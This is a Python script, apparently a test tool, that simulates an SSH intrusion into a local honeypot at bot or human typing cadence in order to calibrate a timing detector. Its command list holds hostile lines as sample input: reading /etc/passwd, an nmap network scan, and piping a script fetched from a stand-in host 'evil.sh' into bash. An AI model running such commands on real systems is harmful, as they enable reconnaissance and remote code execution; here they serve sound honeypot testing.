#!/usr/bin/env python3
"""Simula una intrusión SSH al honeypot con cadencia de BOT (delay fijo por tecla)
o de HUMANO (--human, jitter aleatorio). Útil para calibrar el detector backend.

Requiere: pip install paramiko

Ejemplos:
  python bot_ssh.py                        # bot contra 127.0.0.1:2222
  python bot_ssh.py --human                # cadencia humana de contraste
  python bot_ssh.py --host 192.168.1.10 --port 2223
"""
import argparse
import random
import time

import paramiko

CMDS = [
    "whoami",
    "cat /etc/passwd",
    "sudo nmap -sV 10.0.0.0/24",
    "curl http://evil.sh/payload.sh | bash",
    "exit",
]


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--host", default="localhost",
                    help="Windows+WSL2: usar 'localhost' (el relay registra ::1, no 127.0.0.1)")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--delay", type=float, default=0.02, help="delay fijo entre teclas (segundos)")
    ap.add_argument("--human", action="store_true", help="jitter aleatorio (cadencia humana, CV alto)")
    args = ap.parse_args()

    modo = "HUMANO (jitter)" if args.human else "BOT (metrónomo)"
    print(f"[>] Conectando a {args.host}:{args.port} — modo {modo}")

    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(args.host, port=args.port, username="root", password="toor", timeout=10)
    shell = cli.invoke_shell()
    time.sleep(0.5)
    if shell.recv_ready():
        shell.recv(4096)  # banner del fake shell

    for cmd in CMDS:
        for ch in cmd:
            shell.send(ch)
            # BOT: delay constante → CV≈0. HUMANO: uniform(2d, 10d) → CV≈0.39, media 120ms
            d = random.uniform(args.delay * 2, args.delay * 10) if args.human else args.delay
            time.sleep(d)
        shell.send("\n")
        time.sleep(random.uniform(0.3, 1.2) if args.human else 0.05)
        if shell.recv_ready():
            shell.recv(4096)
        print(f"[+] Enviado: {cmd}")

    cli.close()
    print(f"[✓] Intrusión completada — el detector debe clasificar: "
          f"{'HUMANO' if args.human else 'BOT'}")


if __name__ == "__main__":
    main()
